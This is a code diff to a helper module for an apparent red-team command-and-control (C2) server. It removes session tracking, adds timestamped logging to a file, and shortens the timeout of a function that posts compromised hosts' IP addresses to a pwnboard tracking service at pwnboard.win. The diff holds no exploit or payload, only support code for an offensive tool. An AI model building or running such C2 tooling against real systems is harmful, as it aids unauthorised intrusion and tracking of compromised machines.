@@ -3,17 +3,15 @@ This module contains helper functions to be utilized by the C2.
 """
 # pylint: disable=global-statement
 import json
-import time
 import requests
-from .config import SLACK_KEY_FILE, SLACK_CHANNEL
+from time import strftime, gmtime
+
+from .config import SLACK_KEY_FILE, SLACK_CHANNEL, LOGFILE
 
 SLACK_TOKEN = None
 
-SESSIONS = {}
-RESPONSES = []
 
-
-def error_response(status, error_type, description):
+def _error_response(status, error_type, description):
     """
     Formats an error response.
     """
@@ -24,54 +22,17 @@ def error_response(status, error_type, description):
         'error': True,
     }
 
-def add_action_ids(action_ids):
-    '''
-    Add the given action IDs to the response list
-    '''
-    global RESPONSES
-    epoch = int(time.time())
-    for action in action_ids:
-        RESPONSES += [{
-            'action_id': action,
-            'stdout': '', 'stderr': '',
-            'start_time': epoch, 'end_time': epoch,
-            'error': False
-        }]
-
-def get_responses():
-    '''
-    Get all the stored up responses that we have and reset
-    '''
-    global RESPONSES
-    retval = RESPONSES
-    RESPONSES = []
-    return retval
-
-def add_session(addr, name, session_id):
-    '''
-    add the session id for the given ip and name
-    '''
-    global SESSIONS
-    key = hash(addr+"/"+name)
-    print("New sessions for ",key)
-    SESSIONS[key] = session_id
-
-
-def is_session(addr, name):
-    '''
-    Check if the ip and name is a session, if not, return an empty string
-    '''
-    key = hash(addr+"/"+name)
-    if key in SESSIONS:
-        print("old sessions for ",key)
-        return SESSIONS.get(key)
-    return ""
-
 def log(msg, level='DEBUG'):
     """
     Log a message.
     """
-    print('[{}]{}'.format(level, msg))
+    # Log the output and save the hostname
+    log_line = "{} {}".format(strftime("%H:%M:%S", gmtime()), msg)
+    try:
+        with open(LOGFILE, "a") as logfil:
+            logfil.write(log_line+"\n")
+    except Exception as E:
+        print("Cannot write to", LOGFILE)
 
 def public_ip():
     """
@@ -130,7 +91,7 @@ def updatePwnboard(ip):
     host = "https://pwnboard.win/generic"
     data = {'ip': ip, 'type': "JOYFULNOISE"}
     try:
-        req = requests.post(host, json=data, timeout=3)
+        req = requests.post(host, json=data, timeout=1)
         return True
     except Exception as E:
         slackError("Cannot update pwnboard: {}".format(E))
